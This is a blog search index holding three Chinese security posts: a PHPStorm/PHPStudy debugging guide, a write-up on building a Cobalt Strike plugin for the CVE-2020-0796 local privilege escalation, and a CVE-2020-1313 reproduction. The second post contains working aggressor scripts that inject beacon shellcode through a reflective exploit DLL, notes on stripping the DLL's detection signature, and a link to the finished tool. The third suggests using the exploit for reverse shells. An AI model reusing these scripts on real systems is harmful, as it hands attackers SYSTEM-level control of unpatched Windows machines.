<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>PHPStorm+PHPStudy调试配置</title>
      <link href="/2021/07/27/phpstudy-phpstorm-de-dai-ma-diao-shi-pei-zhi/"/>
      <url>/2021/07/27/phpstudy-phpstorm-de-dai-ma-diao-shi-pei-zhi/</url>
      
        <content type="html"><![CDATA[<h2 id="0x01-简述"><a href="#0x01-简述" class="headerlink" title="0x01 简述"></a>0x01 简述</h2><p>记录代码审计基础中调试环境的配置，主要使用PHPStudy作为服务器，PHPStorm作为开发调试工具，并配置远程调试和本地调试两种方案。远程调试的优点是不需要本地有PHP环境，缺点是需要修改文件时要同步文件修改到远程；本地调试比较方便快捷一些，但是有时候会遇到BlueTeam代码投毒，审计调试的时候主机被控制。这里对两种调试配置方法进行记录。</p><h2 id="0x02-远程调试配置"><a href="#0x02-远程调试配置" class="headerlink" title="0x02 远程调试配置"></a>0x02 远程调试配置</h2><p>使用PHPStudy + PHPStorm远程调试，不用在本地安装PHP环境，不用web服务器，代码执行都交给远程服务器，配置下列项目即可：<br>远程服务器，PHPSdtudy配置:</p><ol><li>开启FTP服务，目录设置为Web目录，用来同步PHPStorm对文件的修改</li><li>php配置开启Xdebug插件</li></ol><p>本地PHPStorm配置</p><ol><li>PHP远程调试</li><li>PHP Web页面</li></ol><h3 id="PHPSdtudy开启FTP"><a href="#PHPSdtudy开启FTP" class="headerlink" title="PHPSdtudy开启FTP"></a>PHPSdtudy开启FTP</h3><p>在FTP选项里配置好用户名和密码，根目录设置为WEB目录<br><img src="https://i.loli.net/2021/07/27/CLW2Zt856zkRpbH.png"></p><h3 id="PHP开启Xdebug"><a href="#PHP开启Xdebug" class="headerlink" title="PHP开启Xdebug"></a>PHP开启Xdebug</h3><p>在Phpstudy菜单软件管理-PHP-设置-扩展组件-Xdebug中设置，选择启用即可:<br><img src="https://i.loli.net/2021/07/27/Wd2yxL3AQvpH7lO.png"><br>查看配置文件：<br><img src="https://i.loli.net/2021/07/27/SnpyvB6g4Xj5rZU.png"><br>在WEB下新建个index.php，写入<code>&lt;?php phpinfo();?&gt;</code>,然后访问发现Xdebug已启用：<br><img src="https://i.loli.net/2021/07/27/TpH2PtfvSkUnl8o.png"><br>接下来把远程调试开启，需要PHPStorm主机的IP地址(我这里是192.168.200.32)，并开启远程调试：<br><img src="https://i.loli.net/2021/07/27/GQYDx2uEXKjt8hl.png"><br>然后重启nginx服务器，接下来就可以配置PHPStorm了。</p><h3 id="PHPStorm远程调试配置"><a href="#PHPStorm远程调试配置" class="headerlink" title="PHPStorm远程调试配置"></a>PHPStorm远程调试配置</h3><p>远程配置涉及到到代码文件的同步，Web页面的显示，远程调试接口的配置。<br><strong>PHP远程调试</strong><br>首先配置远程调试，这里配置其一是服务器Xdeug扩展，二是本地的文件怎么同步到远程。因为本地在文件中添加了语句，需要同步到远程服务器执行才能看到效果，在菜单:运行-编辑配置-PHP远程调试中:<br><img src="https://i.loli.net/2021/07/27/iWhKrUnZj4LIpO1.png"><br>接下来配置部署服务器，部署就是需要将本地文件上传到远程服务器，就是上传到FTP中：<br><img src="https://i.loli.net/2021/07/27/FOWSUtxLeRA7cwa.png"><br>到这里添加一个FTP服务的连接即可，根路径就是FTP的根路径：<br><img src="https://i.loli.net/2021/07/27/OMBDF42Q7GgVdAv.png"><br>然后在配置映射，即为本地要传到远程的路径：<br><img src="https://i.loli.net/2021/07/27/5zOj1GNBFAwQxSb.png"><br>配置好后点击验证，这一步已经配置好文件同步和远程调试功能了：<br><img src="https://i.loli.net/2021/07/27/ZAOsvQViPlwJyMg.png"><br>由于我们需要实时修改文件，所以在&lt;执行前&gt;这个选项中配置一下同步，选择将文件上传到远程主机，配置下要上传的路径即可：<br><img src="https://i.loli.net/2021/07/27/HEQ6A8JcxwBDYsV.png"></p><p><strong>PHP Web页面</strong><br>这里主要是为了在浏览器中显示执行效果，配置本地浏览器要访问远程URL，触发PHP执行，在菜单运行-编辑配置-PHPWeb页面添加：<br><img src="https://i.loli.net/2021/07/27/SaYoXVqCcUlbgn9.png"><br>配置好远程服务器(文件-设置-PHP-服务器):<br><img src="https://i.loli.net/2021/07/27/oiuvHpkYnAKRf2N.png"><br>配置完成后，可以尝试调试查看效果，选择调试，这里先试试Web页面的，选择了Web的配置，点击Run后，打开了浏览器，并成功命中断点，输出<code>$_SERVER</code>信息，这里的Run每次都会打开浏览器访问URL输出，所以打开窗口后刷新页面即可不用再点Run：<br><img src="https://i.loli.net/2021/07/27/rUveWN3PMyo5ucR.png"><br>打开了浏览器后，就可以选择远程调试的配置了，点击调试按钮：<br><img src="https://i.loli.net/2021/07/27/tZAwMuxzalgUQI6.png"><br>刷新刚才的浏览器页面，命中断点：<br><img src="https://i.loli.net/2021/07/27/wlT2YbmiSLjQI9f.png"><br>如果对文件进行了更新，需要再次点击Debug按钮,对传入参数进行调试:<br><img src="https://i.loli.net/2021/07/27/TwAmpSn96PjxBOW.png"><br>到这里远程调试的环境就配置好了。</p><h2 id="0x03-本地调试配置"><a href="#0x03-本地调试配置" class="headerlink" title="0x03 本地调试配置"></a>0x03 本地调试配置</h2><p>本地调试的效果是可以在PHPStorm中运行、调试脚本，也可以配合浏览器运行、调试，参考上面远程调试的配置，开启PHPstudy的Xdebug配置，然后配置好PHPStorm。</p><h3 id="PHPStorm调试配置"><a href="#PHPStorm调试配置" class="headerlink" title="PHPStorm调试配置"></a>PHPStorm调试配置</h3><p>这里的配置是为了在PHPStorm里运行脚本，在运行-编辑配置-PHP脚本中配置好项目入口文件，php解释器二进制文件的位置即可：<br><img src="https://i.loli.net/2021/07/27/R47yMHgfiXGkZtY.png"><br>执行和调试效果都会在PHPStorm中输出：<br><img src="https://i.loli.net/2021/07/27/5CkyU7NPgYa4jrL.png"></p><h3 id="浏览器插件调试"><a href="#浏览器插件调试" class="headerlink" title="浏览器插件调试"></a>浏览器插件调试</h3><p>在浏览器中使用Xdebug helper插件和 PHPStorm进行调试，这里要设置PHPStorm调试的监听端口，PHPStorm的服务器配置，Xdebug helper的Cookie。<br>1.PHPStorm中调试端口配置(文件-设置-调试)<br><img src="https://i.loli.net/2021/07/27/FYLzdEhJGbqcReD.png"><br>这里注意端口会被php-cgi占用，所以把phpstorm监听的端口改成了9100：<br><img src="https://i.loli.net/2021/07/27/zluYXmLJN2qBsh5.png"><br>相应的在php配置文件也进行了更新：<br><img src="https://i.loli.net/2021/07/27/Bv9K6m2PMxUoHzw.png"></p><p>2.PHPStorm服务器配置(文件-设置-服务器):<br>配置好本地服务器的路径即可<br><img src="https://i.loli.net/2021/07/27/Yu31fFp5mo8I7a6.png"></p><p>3.Xdebug helper插件配置<br>到谷歌商店下载Xdebug helper<br><img src="https://i.loli.net/2021/07/27/GMYcTst6iAvCqQE.png"><br>设置Xdebug helper的PhpStorm Cookie(插件显示在扩展栏上，右键选项):<br><img src="https://i.loli.net/2021/07/27/r3BtNYqCleHgK1i.png"><br>访问可以看到Cookie：<br><img src="https://i.loli.net/2021/07/27/153C8vfejSTIhzW.png"><br>在代码中设置设置断点，刷新浏览器即可看到调试效果：<br><img src="https://i.loli.net/2021/07/27/quBQUjZ1Lclpxgf.png"></p><h2 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h2><p>通过对PHP的调试配置，熟悉了PHPStorm和PHPStudy的配置，并成功实现了本地和远程两种调试的配置方法，一般来说在代码安全的情况下，选择本地调试方案比较方便。</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 代码审计 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHPStorm调试 </tag>
            
            <tag> PHP代码审计 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Cobalt Strike插件之CVE-2020-0796提权脚本开发</title>
      <link href="/2021/04/22/cobalt-strike-cha-jian-zhi-cve-2020-0796-ti-quan-jiao-ben-kai-fa/"/>
      <url>/2021/04/22/cobalt-strike-cha-jian-zhi-cve-2020-0796-ti-quan-jiao-ben-kai-fa/</url>
      
        <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>CVE-2020-0796(Windows SMBv3 Client/Server Remote Code Execution Vulnerability)是在SMB v3协议中存在的内存破坏漏洞，可用于远程RCE或本地提权。本文主要是利用已公开<a href="https://github.com/danigargu/CVE-2020-0796">本地提权POC</a>编写Cobalt Strike的提权插件, 用到了反射DLL的方法，具体可以在<a href="https://www.cobaltstrike.com/aggressor-script/functions.html">开发文档</a>中搜索<a href="https://github.com/stephenfewer/ReflectiveDLLInjection">ReflectiveDll</a>。<br>影响版本：<br>Windows Server, version 1909 (Server Core installation)<br>Windows 10 Version 1909 for ARM64-based Systems<br>Windows 10 Version 1909 for x64-based Systems<br>Windows 10 Version 1909 for 32-bit Systems<br>Windows Server, version 1903 (Server Core installation)<br>Windows 10 Version 1903 for ARM64-based Systems<br>Windows 10 Version 1903 for x64-based Systems<br>Windows 10 Version 1903 for 32-bit Systems<br>修补方式：<br>1.安装更新<br>2.Powershell命令禁用压缩功能</p><pre class="line-numbers language-powershell"><code class="language-powershell"><span class="token function">Set-ItemProperty</span> <span class="token operator">-</span>Path <span class="token string">"HKLM:\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters"</span> DisableCompression <span class="token operator">-</span><span class="token function">Type</span> DWORD <span class="token operator">-</span>Value 1 <span class="token operator">-</span>Force<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="0x01-项目构建"><a href="#0x01-项目构建" class="headerlink" title="0x01 项目构建"></a>0x01 项目构建</h2><p>首先将ReflectiveDll项目复制到本地，然后将Poc代码<del>抄</del>整合到项目中(编写过程中会报很多错误，需要慢慢根据报错来修改)：<br><img src="https://i.loli.net/2021/04/21/CjV9hBlpDIR3bov.png"><br>修改入口函数,传递参数:<br><img src="https://i.loli.net/2021/04/21/ulTPmw98fxoicep.png"><br>如果不出意外没有报错后，就开始进行编译设置，选择Release x64，使用多字节字符集:<br><img src="https://i.loli.net/2021/04/21/VLoalXHCx9pDtfj.png"><br>代码生成-运行库选择多线程DLL(/MD)或多线程(/MT):<br><img src="https://i.loli.net/2021/04/21/oWbBnT21Xew9YCE.png"><br>关闭pdb的输出：<br><img src="https://i.loli.net/2021/04/21/EbrfyUDex1GqvcN.png"><br>然后就可以进行编译，成功编译后会输出DLL文件：<br><img src="https://i.loli.net/2021/04/22/VjilL6qYImODM7Z.png"><br>测试好的源码地址：<a href="https://github.com/yanghaoi/Cobalt_Strike_CNA/tree/main/CVE-2020-0796_CNA">github~</a></p><h2 id="0x02-CNA脚本编写"><a href="#0x02-CNA脚本编写" class="headerlink" title="0x02 CNA脚本编写"></a>0x02 CNA脚本编写</h2><p>CNA脚本是Cobalt Strike的插件脚本，用来给beacon下发各种指令增强Cobalt Strike的能力。<br>编写好的脚本如下，会将提权函数注册到beacon右键菜单-执行-提权中。函数会将上一步编译好的DLL反射进内存，然后传递shellcode执行：</p><pre class="line-numbers language-perl"><code class="language-perl"><span class="token function"><span class="token keyword">sub</span> CVE_2020_0796</span> <span class="token punctuation">{</span>    <span class="token keyword">local</span><span class="token punctuation">(</span><span class="token string">'$stager $arch $dll'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    btask<span class="token punctuation">(</span><span class="token variable">$1</span><span class="token punctuation">,</span> <span class="token string">"Task Beacon to run "</span> <span class="token operator">.</span> listener_describe<span class="token punctuation">(</span><span class="token variable">$2</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string">" via CVE-2020-0796"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">#KB4551762</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">-</span>is64 <span class="token variable">$1</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$arch</span> <span class="token operator">=</span> <span class="token string">"x64"</span><span class="token punctuation">;</span>        <span class="token variable">$dll</span> <span class="token operator">=</span> getFileProper<span class="token punctuation">(</span>script_resource<span class="token punctuation">(</span><span class="token string">"modules"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"0796.dll"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token variable">$stager</span> <span class="token operator">=</span> transform<span class="token punctuation">(</span>shellcode<span class="token punctuation">(</span><span class="token variable">$2</span><span class="token punctuation">,</span> false<span class="token punctuation">,</span> <span class="token variable">$arch</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">"hex"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         bdllspawn<span class="token operator">!</span><span class="token punctuation">(</span><span class="token variable">$1</span><span class="token punctuation">,</span> <span class="token variable">$dll</span><span class="token punctuation">,</span><span class="token variable">$stager</span><span class="token punctuation">,</span> <span class="token string">"Elevation of local privileges"</span><span class="token punctuation">,</span> <span class="token number">5000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token punctuation">}</span>beacon_exploit_register<span class="token punctuation">(</span><span class="token string">"CVE_2020_0796"</span><span class="token punctuation">,</span> <span class="token string">"CVE-2020-0796"</span><span class="token punctuation">,</span> <span class="token variable">&amp;CVE_2020_0796</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="0x03-提权测试"><a href="#0x03-提权测试" class="headerlink" title="0x03 提权测试"></a>0x03 提权测试</h2><p>测试之前需要做一下环境的准备工作，先到<a href="https://msdn.itellyou.cn/">MSDN itellyou</a>上下载一个<a href="ed2k://|file|cn_windows_10_business_editions_version_1909_x64_dvd_0ca83907.iso|5275090944|9BCD5FA6C8009E4D0260E4B23008BD47|/">1909的镜像</a>，在虚拟机中安装好后，进行以下设置：</p><ol><li>暂停Windows更新(很关键,自动更新虚拟机占用20%CPU,顺便还把漏洞修了…)</li><li>关闭windows Defender</li><li>添加一个普通用户(net user admin 123 /add)</li><li>完成后保存快照<br><img src="https://i.loli.net/2021/04/22/lqBr4pvfJaLSTR1.png"><br>切换到admin下，随便传个🐴上去执行：<br><img src="https://i.loli.net/2021/04/22/tO9Rb1ckAvru8yz.png"><br>成功提权到SYSTEM:<br><img src="https://i.loli.net/2021/04/22/xOUELmuWTSCyeBs.gif" alt="CVE-2020-0796-LPE"></li></ol><h2 id="0x04-提权原理"><a href="#0x04-提权原理" class="headerlink" title="0x04 提权原理"></a>0x04 提权原理</h2><p>利用漏洞整数溢出(1108*A)，覆盖返回地址指向_SEP_TOKEN_PRIVILEGES结构体，然后通过任意写更改token权限：<br><img src="https://i.loli.net/2021/04/22/uFHX5lao1ULgQ3I.png"><br>之后找到一个高权限进程进行shellcode注入，获取权限。</p><h2 id="0x05-问题整理"><a href="#0x05-问题整理" class="headerlink" title="0x05 问题整理"></a>0x05 问题整理</h2><ol><li>Shellcode大小计算<br>CNA脚本在利用反射DLL提权时，会给DLL传递shellcode参数，用的是这两个函数生成载荷：<a href="https://www.cobaltstrike.com/aggressor-script/functions.html#shellcode">shellcode</a>和<a href="https://www.cobaltstrike.com/aggressor-script/functions.html#stager">stager</a>，4.1可以用<a href="https://www.cobaltstrike.com/aggressor-script/functions.html#payload_local">payload_local</a>。</li></ol><pre class="line-numbers language-shell"><code class="language-shell">$data = shellcode("my listener", false, "x64");$data = stager("my listener", "x64");<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>在DLL代码中，拿到该shellcode后，会进行长度计算，然后分配内存写入。而对传入的shellcode进行计算无非两种方法，单目运算符sizeof()和函数strlen(const char* str)，在进行shellcode计算时会遇到00字节导致计算错误，导致注入的系统进程(如winlogo.exe)崩溃，造成系统注销或重启。实验通过以下几种方案来尝试获得shellcode大小：<br>方案1(失败):<br>先看这第一种直接传入shellcode二进制流的方法：<br>使用<code>$stager = shellcode($2, false, $arch);</code>来生成shellcode：<br><img src="https://i.loli.net/2021/04/22/Rpi7bPoetvjBrkY.png"><br>可以正常获取到shellcode，但是没有办法计算分配的内存大小。<br>方案2(成功)：<br>方案2是开发的插件采用的方法，在方案1中无论如何都无法获得正确的shellcode内存大小，这时想到之前利用http加载shellcode执行的方法，在程序中会接收字符串(ascll)形式的shellcode，然后再转为hex形式的c-shellcode进入内存执行。<br>如下的示例,只有第二组的shellcode进入内存才会被正确执行：<br><img src="https://i.loli.net/2021/04/22/ZmkRoY1fTpWL5K6.png"><br>方案1问题在于无法获得正确的shellcode长度，方案2那么就先让它获取长度，而传入字符串可以使用strlen来获取长度，所以使用<code>$stager = transform(shellcode($2, false, $arch),"hex");</code>来转换shellcode为hex编码的字符串：<br><img src="https://i.loli.net/2021/04/22/EK5f1znFp4ky3IR.png"><br> 现在长度获取到了，就需要将字符串的shellcode转换成c-shellcode进内存执行，进行转换的代码：<br> <img src="https://i.loli.net/2021/04/22/Sd2vbzxgWjsDaYC.png"><br> 经过转换后，可以发现出现了熟悉的“麳冧痂”，剩下的就是按照漏洞利用流程在进程内存开辟891的空间，然后写入shellcode了：<br> <img src="https://i.loli.net/2021/04/22/x479DlbpJzjoHRK.png"><br> 方案3(成功)：<br> 在前两个方案中，要么就是无法获取长度，要么就是得转换shellcode，为什么不能在cna脚本里传递参数的时候就把长度给DLL呢。这里可以看下metasploit-framework的实现方法(专业!)，安装了metasploit后可以在<code>metasploit-framework\embedded\framework\external\source\exploits\CVE-2020-0796</code>下查看到源码：<br> <img src="https://i.loli.net/2021/04/22/xwBRMyazk8v6hEZ.png"><br> metasploit是通过定义一个结构体，定义两种不同类型的参数：</p><pre class="line-numbers language-thrift"><code class="language-thrift"> typedef struct _MSF_PAYLOAD {    DWORD  dwSize;    CHAR  cPayloadData[];} MSF_PAYLOAD;typedef MSF_PAYLOAD* PMSF_PAYLOAD;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在cna脚本中传递过来的参数就为：</p><pre class="line-numbers language-shell"><code class="language-shell">$stager = shellcode($2, false, $arch);$stager = pack("I-", strlen($stager)) . $stager;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>执行结果可以看到正确获取大小和数据流：<br><img src="https://i.loli.net/2021/04/22/z5bvSsJoWVClycR.png"><br>更棒的是，metasploit的exp可以直接拿过来用，只需要编写cna脚本传递参数即可。<br><img src="https://i.loli.net/2021/04/22/Wsl15bqRNgyDaY3.png"></p><ol start="2"><li><p>导出函数名<br>在这里想尝试修改默认DLL的导出函数(去除特征ReflectiveLoader)：<br><img src="https://i.loli.net/2021/04/22/UsWv7omgKflXJEM.png"><br>修改完成后编译，使用dumpbin工具查看DLL导出函数：</p><pre class="line-numbers language-taggerscript"><code class="language-taggerscript">>"D:\Program Files (x86)\Microsoft Visual Studio\2019\Community\VC\Tools\MSVC\14.27.29110\bin\Hostx64\x64\dumpbin.exe" /exports reflective_dll.x64.dll<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://i.loli.net/2021/04/22/Us9ltDmnLVfobRN.png"><br>然后加载执行：<br><img src="https://i.loli.net/2021/04/22/wJx4LFIMBaWSm6p.png"><br>额….，那还是老实用ReflectiveLoader。</p></li><li><p>Beacon exit后进程崩溃<br><img src="https://i.loli.net/2021/04/22/COTzDYKIRbN6qwE.gif" alt="Exit"><br>考虑是shellcode的原因，就像在beacon.exe中退出一样，进程会直接退出，那么就需要一个可以创建线程的shellcode来实现分离。在手册中看到有一个shellcode生成函数：<br><img src="https://i.loli.net/2021/04/22/iRN86mYyxcl2hSf.png"><br>在cs4.0下报错，函数不存在:<br><img src="https://i.loli.net/2021/04/22/fjROk9tbyZwBFgQ.png"><br>使用cs4.1进行测试成功，exit后进程不崩溃：<br><img src="https://i.loli.net/2021/04/22/USb3cCIfxXF4Ta6.gif"><br>cna脚本如下：</p><pre class="line-numbers language-perl"><code class="language-perl"><span class="token comment" spellcheck="true">#cs4.1</span><span class="token function"><span class="token keyword">sub</span> CVE_2020_0796</span> <span class="token punctuation">{</span> <span class="token keyword">local</span><span class="token punctuation">(</span><span class="token string">'$stager'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token operator">-</span>is64 <span class="token variable">$1</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>     berror<span class="token punctuation">(</span><span class="token variable">$1</span><span class="token punctuation">,</span> <span class="token string">"cve-2020-0796 exploit is x64 only"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     return<span class="token punctuation">;</span> <span class="token punctuation">}</span> println<span class="token punctuation">(</span><span class="token string">"1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> btask<span class="token punctuation">(</span><span class="token variable">$1</span><span class="token punctuation">,</span> <span class="token string">"Task Beacon to run "</span> <span class="token operator">.</span> listener_describe<span class="token punctuation">(</span><span class="token variable">$2</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string">" cve-2020-0796"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$stager</span> <span class="token operator">=</span> payload_local<span class="token punctuation">(</span><span class="token variable">$1</span><span class="token punctuation">,</span> <span class="token variable">$2</span><span class="token punctuation">,</span> <span class="token string">"x64"</span><span class="token punctuation">,</span> <span class="token string">"thread"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$stager</span> <span class="token operator">=</span> pack<span class="token punctuation">(</span><span class="token string">"I-"</span><span class="token punctuation">,</span> strlen<span class="token punctuation">(</span><span class="token variable">$stager</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token variable">$stager</span><span class="token punctuation">;</span> <span class="token variable">$dll</span> <span class="token operator">=</span> getFileProper<span class="token punctuation">(</span>script_resource<span class="token punctuation">(</span><span class="token string">"modules"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"reflective_dll.x64.dll"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  bdllspawn<span class="token operator">!</span><span class="token punctuation">(</span><span class="token variable">$1</span><span class="token punctuation">,</span> getFileProper<span class="token punctuation">(</span>script_resource<span class="token punctuation">(</span><span class="token string">"modules"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"reflective_dll.x64.dll"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token variable">$stager</span><span class="token punctuation">,</span> <span class="token string">"cve-2020-0796"</span><span class="token punctuation">,</span> <span class="token number">5000</span><span class="token punctuation">)</span><span class="token punctuation">;</span> beacon_link<span class="token punctuation">(</span><span class="token variable">$1</span><span class="token punctuation">,</span> <span class="token variable">$null</span><span class="token punctuation">,</span> <span class="token variable">$3</span><span class="token punctuation">[</span><span class="token string">'listener'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span>beacon_exploit_register<span class="token punctuation">(</span><span class="token string">"CVE_2020_0796"</span><span class="token punctuation">,</span> <span class="token string">"CVE-2020-0796"</span><span class="token punctuation">,</span> <span class="token variable">&amp;CVE_2020_0796</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>另外在4.1中普通权限获取的beacon信息中Build号(影响18362和18363)实际测试并不准确:</p></li></ol><pre class="line-numbers language-powershell"><code class="language-powershell"><span class="token comment" spellcheck="true">#输出beacon信息</span><span class="token keyword">foreach</span> <span class="token variable">$key</span> => <span class="token variable">$value</span> <span class="token punctuation">(</span>binfo<span class="token punctuation">(</span><span class="token variable">$1</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        println<span class="token punctuation">(</span><span class="token string">"$[15]key <span class="token variable">$value</span>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://i.loli.net/2021/04/22/DEsqGh5YbZoW24t.png"></p><h2 id="0x06-参考链接"><a href="#0x06-参考链接" class="headerlink" title="0x06 参考链接"></a>0x06 参考链接</h2><p><a href="https://bbs.pediy.com/thread-262027.htm">https://bbs.pediy.com/thread-262027.htm</a><br><a href="https://github.com/pandasec888/taowu-cobalt-strike">https://github.com/pandasec888/taowu-cobalt-strike</a><br><a href="https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2020-0796">https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2020-0796</a></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 安全工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CVE-2020-0796 </tag>
            
            <tag> Cobalt Strike </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2020-1313复现</title>
      <link href="/2020/10/09/cve-2020-1313-fu-xian/"/>
      <url>/2020/10/09/cve-2020-1313-fu-xian/</url>
      
        <content type="html"><![CDATA[<h4 id="1-前言"><a href="#1-前言" class="headerlink" title="1. 前言"></a>1. 前言</h4><blockquote><p>CVE-ID:CVE-2020-1313</p><p>类型：本地提权</p><p>POC: <a href="https://github.com/irsl/CVE-2020-1313">https://github.com/irsl/CVE-2020-1313</a></p><p>原理：利用Windows Update Orchestrator Service (是一个DCOM服务9C695035-48D2-4229-8B73-4C70E756E519) 暴露的API方法无需认证来进行计划任务的设置，计划任务以SYSTEM权限执行，导致权限提升。</p><p>影响版本：<br>Windows 10 Version 1903 for 32-bit Systems<br>Windows 10 Version 1903 for ARM64-based Systems<br>Windows 10 Version 1903 for x64-based Systems<br>Windows 10 Version 1909 for 32-bit Systems<br>Windows 10 Version 1909 for ARM64-based Systems<br>Windows 10 Version 1909 for x64-based Systems<br>Windows 10 Version 2004 for 32-bit Systems<br>Windows 10 Version 2004 for ARM64-based Systems<br>Windows 10 Version 2004 for x64-based Systems<br>Windows Server, version 1903 (Server Core installation)<br>Windows Server, version 1909 (Server Core installation)<br>Windows Server, version 2004 (Server Core installation)</p></blockquote><h4 id="2-编译复现"><a href="#2-编译复现" class="headerlink" title="2. 编译复现"></a>2. 编译复现</h4><p> 拉取poc后直接编译成Debug版本后，在虚拟机中cmd执行发现没有反应，双击执行后报错(物理机正常执行，考虑是虚拟机中运行环境的原因):</p><p><img src="https://i.loli.net/2020/10/09/fChwuaHAze9I3xg.png" alt="缺失DLL"></p><p>搜索缺少的DLL后，看到文章(<a href="https://blog.csdn.net/so_geili/article/details/53009680">https://blog.csdn.net/so_geili/article/details/53009680</a> 和 <a href="https://www.cnblogs.com/xzabg/p/5875296.html),%E8%AF%B4%E6%98%AF%E7%BC%96%E8%AF%91%E7%9A%84%E5%8E%9F%E5%9B%A0%EF%BC%8C%E7%84%B6%E5%90%8Evs%E8%BF%9B%E8%A1%8C%E8%AE%BE%E7%BD%AE%E5%A6%82%E4%B8%8B%EF%BC%9A">https://www.cnblogs.com/xzabg/p/5875296.html),说是编译的原因，然后vs进行设置如下：</a></p><p><img src="https://i.loli.net/2020/10/09/V6KjMf8JYCZAUwr.png" alt="运行库设置"></p><p>在项目属性-C/C++-代码生成-运行库中将其设置为静态编译 /MTd ，编译成功后文件为849kb：<br><img src="https://i.loli.net/2020/10/09/koVfPg2RhBL9EYz.png" alt="执行"></p><p>随后放到虚拟机里执行成功，可以看到注册表中新增了一项，命令在之后的一段时间内会自动触发。<br>接下来试试将选项设置为 release，生成后大小13kb:<br><img src="https://i.loli.net/2020/10/09/BQ2uz8SaMoVWmC1.png" alt="release"><br>执行成功：<br><img src="https://i.loli.net/2020/10/09/1tIb6v3nMmXyxNU.png" alt="执行成功"><br>然后一段时间后会在C盘生成个命令执行的txt，实际利用可以用powershell等来执行其他反弹shell的操作~</p><h4 id="3-其他"><a href="#3-其他" class="headerlink" title="3. 其他"></a>3. 其他</h4><p>在编译过程中，遇到运行库的问题，将网上看到的在这里记录一下。</p><h5 id="1-运行库设置"><a href="#1-运行库设置" class="headerlink" title="1.运行库设置"></a>1.运行库设置</h5><blockquote><p>多线程(/MT)、多线程调试(/MTd)、多线程DLL(/MD)、多线程调试DLL(/MDd)、单线程(/ML)、单线程调试(/MLd)，带D的是Debug模式，单线程运行时库选项/ML和/MLd在VS2003以后就取消了。<br>/MT 、 /MTd：<br>/MT和/MTd表示采用多线程CRT库的静态lib版本。该选项会在编译时将运行时库以静态lib的形式完全嵌入。该选项生成的可执行文件运行时不需要运行时库dll的参加，会获得轻微的性能提升，但最终生成的二进制代码因链入庞大的运行时库实现而变得非常臃肿。当某项目以静态链接库的形式嵌入到多个项目，则可能造成运行时库的内存管理有多份，最终将导致致命的“Invalid Address specified to 